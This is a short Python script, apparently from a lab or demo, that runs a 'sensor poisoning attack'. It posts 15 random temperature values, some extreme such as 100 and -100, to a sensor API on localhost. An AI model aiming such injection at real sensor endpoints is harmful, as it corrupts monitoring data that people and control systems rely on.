import random
import time
import requests

TARGET = "http://127.0.0.1:8000/sensors/temperature"

def poison_sensor():
    """
    Injects poisoned sensor values
    """
    values = [50.0, -50.0, 15.9, 16.7, 17.2, 18.4, 19.7, 20.1, 21.5, 22.0, 23.0, 24.9, 29.1, 30.2, 100.0, 0.0, 100.0, -100.0]
    for _ in range(15):
        v = random.choice(values)
        payload = {"value": v}
        r = requests.post(TARGET, json=payload)
        print(f" ~ Sent {v} --> ", r.status_code, r.text)
        time.sleep(1)

if __name__ == "__main__":
    print("[*] Starting sensor poisoning attack")
    poison_sensor()
